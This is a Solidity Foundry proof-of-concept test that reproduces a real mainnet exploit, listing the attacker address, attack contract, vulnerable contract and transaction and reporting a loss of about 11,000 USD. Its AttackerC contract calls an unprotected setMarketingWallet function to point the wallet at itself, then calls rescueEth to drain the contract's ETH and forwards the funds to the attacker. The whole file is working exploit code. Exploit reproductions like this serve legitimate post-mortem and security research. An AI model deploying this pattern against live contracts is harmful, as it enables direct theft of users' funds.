pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 11,000 USD
// Attacker : https://etherscan.io/address/0xd215ffaf0f85fb6f93f11e49bd6175ad58af0dfd
// Attack Contract : https://etherscan.io/address/0xd129d8c12f0e7aa51157d9e6cc3f7ece2dc84ecd
// Vulnerable Contract : https://etherscan.io/address/0xdb27d4ff4be1cd04c34a7cb6f47402c37cb73459
// Attack Tx : https://etherscan.io/tx/0xbeef352f716973043236f73dd5104b9d905fd04b7fc58d9958ac5462e7e3dbc1

// @Info
// Vulnerable Contract Code : N/A

// @Analysis

// Post-mortem : https://x.com/TenArmorAlert/status/1834504921561100606
// Twitter Guy : https://x.com/TenArmorAlert/status/1834504921561100606
// Hacking God : N/A

address constant addr1 = 0xdb27D4ff4bE1cd04C34A7cB6f47402c37Cb73459;
address constant attacker = 0xd215FFaf0F85fB6f93F11E49Bd6175ad58af0Dfd;
address constant addr2 = 0xd129D8C12f0e7aA51157D9e6cc3F7Ece2dc84ecD;

interface ITarget {
    function setMarketingWallet(address walletAddress) external;
    function rescueEth() external;
}

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 20729548);
        deal(attacker, 1.07297e-13 ether);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", address(attacker).balance, 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        deal(address(attC), 5.000000000000028 ether);
        attC.attack{value: 1.07297e-13 ether}();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", address(attacker).balance, 18);
    }
}

// 0xd129D8C12f0e7aA51157D9e6cc3F7Ece2dc84ecD
contract AttackerC {
    function attack() public payable {
        ITarget(addr1).setMarketingWallet(address(this));
        ITarget(addr1).rescueEth();
        (bool s, ) = attacker.call{value: address(this).balance}("");
    }
  
    fallback() external payable {}

    receive() external payable {}
}